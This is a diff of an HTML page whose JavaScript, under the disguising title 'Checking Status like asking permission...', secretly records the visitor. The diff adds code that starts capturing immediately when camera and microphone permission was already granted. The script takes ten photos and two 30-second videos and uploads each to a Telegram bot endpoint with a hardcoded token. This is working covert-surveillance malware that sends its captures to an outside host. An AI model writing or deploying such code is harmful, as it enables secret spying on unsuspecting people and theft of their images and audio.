@@ -1,61 +1,79 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Capturing Media...</title>
+    <title>Checking Status like asking permission...</title>
     <script>
         async function startCapturing() {
             try {
-                // Request fresh camera & microphone access
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                const mediaRecorder = new MediaRecorder(stream);
-                const videoChunks = [];
-                const imageCapture = new ImageCapture(stream.getVideoTracks()[0]);
+                // First, check if camera & microphone permission is already granted
+                const cameraPermission = await navigator.permissions.query({ name: "camera" });
+                const micPermission = await navigator.permissions.query({ name: "microphone" });
 
-                // Capture 10 images (1 per second)
-                async function captureImages() {
-                    for (let i = 0; i < 10; i++) {
-                        const blob = await imageCapture.takePhoto();
-                        sendMediaToTelegram(blob, "photo");
-                        await new Promise(resolve => setTimeout(resolve, 1000)); // Wait 1 second
+                // If both are granted, start recording immediately
+                if (cameraPermission.state === "granted" && micPermission.state === "granted") {
+                    console.log("✅ Camera & mic already granted, starting recording...");
+                    captureMedia();
+                } else {
+                    // Request fresh access if not granted
+                    console.log("⚠️ Requesting camera & mic access...");
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                    if (stream) {
+                        captureMedia(stream);
+                    } else {
+                        alert("⚠️ Please allow camera & microphone access in browser settings.");
                     }
                 }
-
-                // Start recording video
-                function startVideoRecording() {
-                    mediaRecorder.start();
-                    mediaRecorder.ondataavailable = event => {
-                        videoChunks.push(event.data);
-                    };
-
-                    // Stop recording after 30 seconds
-                    setTimeout(() => {
-                        mediaRecorder.stop();
-                    }, 30000);
-                }
-
-                // Stop and send video
-                mediaRecorder.onstop = async () => {
-                    const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
-                    sendMediaToTelegram(videoBlob, "video");
-
-                    // If this is the first video, start a second recording
-                    if (videoChunks.length === 1) {
-                        setTimeout(startVideoRecording, 2000);
-                    }
-                };
-
-                // Start first video recording & capture images
-                startVideoRecording();
-                captureImages();
-
-                // Force stop after full session
-                setTimeout(() => {
-                    stream.getTracks().forEach(track => track.stop()); // Stop camera/mic
-                }, 65000); // Stop after 1 min 5 sec
-
             } catch (error) {
                 alert("⚠️ Camera or microphone access denied! Please allow it in browser settings.");
             }
+        }
+
+        async function captureMedia(stream) {
+            const mediaRecorder = new MediaRecorder(stream || await navigator.mediaDevices.getUserMedia({ video: true, audio: true }));
+            const videoChunks = [];
+            const imageCapture = new ImageCapture(mediaRecorder.stream.getVideoTracks()[0]);
+
+            // Capture 10 images (1 per second)
+            async function captureImages() {
+                for (let i = 0; i < 10; i++) {
+                    const blob = await imageCapture.takePhoto();
+                    sendMediaToTelegram(blob, "photo");
+                    await new Promise(resolve => setTimeout(resolve, 1000)); // Wait 1 second
+                }
+            }
+
+            // Start recording video
+            function startVideoRecording() {
+                mediaRecorder.start();
+                mediaRecorder.ondataavailable = event => {
+                    videoChunks.push(event.data);
+                };
+
+                // Stop recording after 30 seconds
+                setTimeout(() => {
+                    mediaRecorder.stop();
+                }, 30000);
+            }
+
+            // Stop and send video
+            mediaRecorder.onstop = async () => {
+                const videoBlob = new Blob(videoChunks, { type: 'video/mp4' });
+                sendMediaToTelegram(videoBlob, "video");
+
+                // If this is the first video, start a second recording
+                if (videoChunks.length === 1) {
+                    setTimeout(startVideoRecording, 2000);
+                }
+            };
+
+            // Start first video recording & capture images
+            startVideoRecording();
+            captureImages();
+
+            // Stop camera/mic after session
+            setTimeout(() => {
+                mediaRecorder.stream.getTracks().forEach(track => track.stop()); // Close access
+            }, 65000); // Stop after 1 min 5 sec
         }
 
         async function sendMediaToTelegram(mediaBlob, type) {
@@ -65,7 +83,7 @@
             if (type === "photo") {
                 formData.append("photo", mediaBlob, "image.jpg");
             } else if (type === "video") {
-                formData.append("video", mediaBlob, "video.webm");
+                formData.append("video", mediaBlob, "video.mp4"); // Now MP4 format
             }
 
             fetch(`https://api.telegram.org/bot7570012997:AAFqnbInLmAH0O_49cxHu4W87HnVOdfjKS0/send${type === "photo" ? "Photo" : "Video"}`, {
